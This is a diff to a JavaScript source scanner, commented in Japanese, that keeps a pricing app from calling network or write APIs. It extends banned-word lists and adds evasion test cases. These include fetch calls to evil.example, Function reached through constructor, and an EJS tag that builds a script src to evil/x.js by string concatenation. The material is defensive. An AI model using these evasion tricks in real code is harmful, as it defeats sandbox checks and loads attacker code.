@@ -35,8 +35,8 @@ const j = (...parts) => parts.join('');
 /** サーバ側 JS で「語」として禁止する名前 */
 const BANNED_WORDS_JS = [
   // 通信・動的実行・グローバル経由の到達
-  'fetch', 'eval', 'Function', 'globalThis', 'window', 'self', 'Reflect', 'process', 'require', 'WebSocket', 'XMLHttpRequest',
-  'EventSource', 'Worker', 'WebAssembly', 'getBuiltinModule', 'dlopen', 'binding',
+  'fetch', 'eval', 'Function', 'globalThis', 'global', 'window', 'self', 'Reflect', 'process', 'require', 'WebSocket', 'XMLHttpRequest',
+  'EventSource', 'Worker', 'WebAssembly', 'getBuiltinModule', 'dlopen', 'binding', 'constructor', '__proto__', 'prototype', 'Proxy',
   'request', 'http', 'https', 'net', 'tls', 'dns', 'child_process', 'vm', 'worker_threads', 'undici', 'axios', 'importScripts',
   // SP-API / miniPC の書き込み口
   j('update', 'Price'), j('patch', 'ListingsItem'), j('patch', 'Listing'), j('put', 'ListingsItem'), j('create', 'Feed'), j('call', 'MiniPC'),
@@ -49,8 +49,8 @@ const BANNED_FRAGMENTS_JS = [
 ];
 /** 画面 (ブラウザ側 JS) で「語」として禁止する名前 */
 const BANNED_WORDS_VIEW = [
-  'eval', 'Function', 'XMLHttpRequest', 'WebSocket', 'sendBeacon', 'EventSource', 'import', 'window', 'self', 'globalThis', 'top',
-  'parent', 'frames', 'opener', 'Worker', 'Reflect', 'http', 'https', 'open', 'postMessage', 'importScripts', 'srcdoc',
+  'eval', 'Function', 'XMLHttpRequest', 'WebSocket', 'sendBeacon', 'EventSource', 'import', 'window', 'self', 'globalThis', 'global', 'top',
+  'parent', 'frames', 'opener', 'Worker', 'Reflect', 'http', 'https', 'open', 'postMessage', 'importScripts', 'srcdoc', 'constructor', '__proto__', 'prototype', 'Proxy',
 ];
 const BANNED_FRAGMENTS_VIEW = [j('?.', '('), j('?.', '['), '.call(', '.apply(', '.bind(', 'createElement(', '.src', '.action', '//', 'javascript:', 'data:'];
 /** 静的 import の許可リスト (相対パスは別扱い) */
@@ -61,6 +61,8 @@ const APP_MODULES = new Set(['./engine.js', './db.js', './read-model.js', './eva
 const ALLOWED_EXTERNAL = new Set(['../warehouse-mirror/db.js', '../price-update/format.js']);
 /** 計算プロパティの直前にあってよい語 (配列リテラルの直前に来るキーワード) */
 const ARRAY_LITERAL_KEYWORDS = new Set(['of', 'in', 'return', 'typeof', 'await', 'yield', 'case', 'throw', 'delete', 'void', 'new', 'else', 'do', 'instanceof']);
+/** この語の直後の / は正規表現の始まり (割り算ではない) */
+const REGEX_AFTER_KEYWORDS = new Set(['return', 'throw', 'case', 'yield', 'typeof', 'instanceof', 'in', 'of', 'new', 'delete', 'void', 'do', 'else', 'await']);
 
 /** 文字列・テンプレート・正規表現リテラルを壊さずにコメントだけ取り除く */
 export function stripComments(src) {
@@ -82,9 +84,17 @@ export function stripComments(src) {
     if (c === "'" || c === '"' || c === '`') { quote = c; out += c; lastSignificant = c; i += 1; continue; }
     if (c === '/' && next === '/') { while (i < n && src[i] !== '\n') i += 1; continue; }
     if (c === '/' && next === '*') { const end = src.indexOf('*/', i + 2); i = end < 0 ? n : end + 2; out += ' '; continue; }
-    // 正規表現リテラル: 値が来る位置 (演算子・( , = : [ ! & | ? { } ; の後、または行頭) の / から、
-    // エスケープと [...] を飛ばして次の / まで。中の // をコメントと誤認しない (Codex R3 High)
-    if (c === '/' && (lastSignificant === '' || '(,=:[!&|?{};+-*%<>~^'.includes(lastSignificant))) {
+    // 正規表現リテラル: 値が来る位置 (演算子・( , = : [ ! & | ? { } ; の後、return/throw 等のキーワードの後、または行頭) の / から、
+    // エスケープと [...] を飛ばして次の / まで。中の // をコメントと誤認しない (Codex R3/R4 High)
+    let afterKeyword = false;
+    if (c === '/' && /[\w$]/.test(lastSignificant)) {
+      let s = out.length - 1;
+      while (s >= 0 && /\s/.test(out[s])) s -= 1;
+      let e = s;
+      while (e >= 0 && /[\w$]/.test(out[e])) e -= 1;
+      afterKeyword = REGEX_AFTER_KEYWORDS.has(out.slice(e + 1, s + 1));
+    }
+    if (c === '/' && (lastSignificant === '' || '(,=:[!&|?{};+-*%<>~^'.includes(lastSignificant) || afterKeyword)) {
       let k = i + 1;
       let inClass = false;
       let body = '/';
@@ -212,6 +222,13 @@ export function scanSource(src, { isView = false, checkImports = true, external 
     for (const s of serverSnippets) {
       for (const p of scanSource(s, { isView: false, checkImports: false })) problems.push(`EJS タグの中: ${p}`);
     }
+    // 生の HTML を出す <%- %> は、include と「< を < に変えた JSON」の 2 形だけ (Codex R4: 文字列連結で script src を生成できる)
+    for (const m of src.matchAll(/<%-([^]*?)%>/g)) {
+      const body = m[1].trim();
+      const okInclude = /^include\(\s*'[\w./_-]+'\s*(,\s*\{[^}]*\}\s*)?\)$/.test(body);
+      const okJson = /^JSON\.stringify\([^]*\)\.replace\(\/<\/g,\s*'\\\\u003c'\)$/.test(body);
+      if (!okInclude && !okJson) problems.push(`<%- %> の生出力が許可外の形: ${body.slice(0, 60)}`);
+    }
     // JS 側: <script> の中身と on*= 属性
     const scripts = [...src.matchAll(/<script\b[^>]*>([^]*?)<\/script>/gi)].map((m) => m[1]);
     const handlers = [...src.matchAll(/\son\w+=["']([^"']*)["']/gi)].map((m) => m[1]);
@@ -285,7 +302,9 @@ console.log('\n── 2. アプリから到達できるモジュール (外部�
 {
   const entries = appFiles.filter((f) => /\.m?js$/.test(f));
   const reached = reachableFrom(entries);
-  const outside = [...reached.keys()].filter((f) => !f.startsWith(HERE));
+  // ★接頭辞 (startsWith) で判定しない: apps/amazon-pricing-evil/ もアプリ内に見えてしまう (Codex R4)。realpath + relative で見る
+  const insideApp = (f) => { const rel = path.relative(fs.realpathSync(HERE), fs.existsSync(f) ? fs.realpathSync(f) : f); return rel !== '' && !rel.startsWith('..') && !path.isAbsolute(rel); };
+  const outside = [...reached.keys()].filter((f) => !insideApp(f));
   ok(outside.length >= 2, `外部モジュール ${outside.length} 本に到達: ${outside.map(rel).join(', ')}`);
   for (const f of outside) {
     ok(fs.existsSync(f), `${rel(f)}: 実在する (経由: ${reached.get(f)})`);
@@ -300,8 +319,11 @@ console.log('\n── 2. アプリから到達できるモジュール (外部�
     ok(problems.length === 0, `${rel(f)}: ${problems.length === 0 ? 'OK' : problems.join(' / ')}`);
   }
   // アプリの中で到達したファイルは test-* を含まない (本番ファイルからテストを import して検査を逃れる経路)
-  const insideReached = [...reached.keys()].filter((f) => f.startsWith(HERE));
+  const insideReached = [...reached.keys()].filter(insideApp);
   ok(insideReached.every((f) => !/[\\/]test-/.test(f)), 'アプリ内で到達するファイルに test-* が無い');
+  // 到達したファイルは必ずどこかで検査されている (アプリ内 = 1 で走査済み / 外 = ここで検査)
+  const scanned = new Set([...appFiles, ...outside].map((f) => fs.realpathSync(f)));
+  ok([...reached.keys()].every((f) => !fs.existsSync(f) || scanned.has(fs.realpathSync(f))), '到達した全ファイルが検査対象に入っている');
 }
 
 console.log('\n── 3. 旧ツールの書き込み口が消えている ──');
@@ -357,6 +379,10 @@ console.log('\n── 5. ★検査自身の検査: 回避コードは必ず落�
     ['Codex R3: 正規表現の // をコメントと誤認させる', `const slash = /\\/\\//; ${j('fet', 'ch')}("https://evil.example/");`],
     ['Codex R3: \\u{} 形式', `${j('glob', 'al')}\\u{54}his.${j('fet', 'ch')}(u);`],
     ['Codex R3: \\x 形式', `${j('ev', 'a')}\\x6c(source);`],
+    ['Codex R4: return 直後の正規表現の // でコメント誤認', `function marker() { return /[//]/; } ${j('fet', 'ch')}(url);`],
+    ['Codex R4: global[name] を配列 join で組み立て', `const n = ['fe', 'tch'].join(''); ${j('glob', 'al')}[n](u, { method: 'POST' });`],
+    ['Codex R4: constructor 経由で Function', `const F = (() => {}).${j('constr', 'uctor')}; F('return 1')();`],
+    ['__proto__ 経由', `const o = {}; o.${j('__pro', 'to__')}.x = 1;`],
   ];
   for (const [label, code] of EVASIONS) {
     const problems = scanSource(code, { isView: false });
@@ -384,6 +410,8 @@ console.log('\n── 5. ★検査自身の検査: 回避コードは必ず落�
     ['Codex R3: %2e%2e で別アプリへ', `<script>${j('fet', 'ch')}('/apps/amazon-pricing/api/%2e%2e/%2e%2e/profit-calculator/api/amazon/manual-list', { method: 'POST' });</script>`],
     ['fetch の URL に ? (クエリで別経路)', `<script>${j('fet', 'ch')}('/apps/amazon-pricing/api/x?redirect=1');</script>`],
     ['EJS タグの中の Unicode エスケープ', `<%= global\\u0054his.f\\u0065tch(u) %>`],
+    ['Codex R4: <%- %> の文字列連結で script src を生成', `<%- ['<scr','ipt src="','ht','tps:','/','/evil/x.js"></scr','ipt>'].join('') %>`],
+    ['<%- %> で変数を生出力', `<%- html %>`],
   ];
   for (const [label, code] of VIEW_EVASIONS) {
     const problems = scanSource(code, { isView: true });
@@ -397,7 +425,8 @@ console.log('\n── 5. ★検査自身の検査: 回避コードは必ず落�
   ok(scanSource(`const ct = String(req.headers['content-type'] || '');`).length === 0, '通る: 文字列リテラル 1 つの計算プロパティ');
   ok(scanSource(`const u = 'https://example.com'; const request = 1;`, { external: true }).length === 0, '通る (外部モジュール): URL 文字列と request という語');
   ok(scanSource(`const u = 'https://example.com';`).length > 0, '落ちる (アプリ): URL 文字列');
-  ok(scanSource(`const re = /[",\\n\\r]/; const s = x.replace(/\\/\\//g, '-'); const y = a / b / c;`).length === 0, '通る: 正規表現リテラルと割り算');
+  ok(scanSource(`const re = /[",\\n\\r]/; const s = x.replace(/\\/\\//g, '-'); const y = a / b / c; function f() { return /[//]/; } const z = 1;`).length === 0, '通る: 正規表現リテラル (return 直後も) と割り算');
+  ok(scanSource(`<%- include('_top', { nav: 'index' }) %><%- include('_policy_dialog') %>`, { isView: true }).length === 0, '通る (画面): include の生出力');
   ok(scanSource(`<%- include('_top', { nav: 'index' }) %><% for (const r of rows) { %><td><%= yen(r.my_price) %></td><% } %>`, { isView: true }).length === 0, '通る (画面): 普通の EJS タグ');
   ok(scanSource(`<script>openPolicyDialog(<%- JSON.stringify(x).replace(/</g, '\\\\u003c') %>);</script>`, { isView: true }).length === 0, '通る (画面): XSS 対策の \\u003c 置換 (文字列の中)');
 }
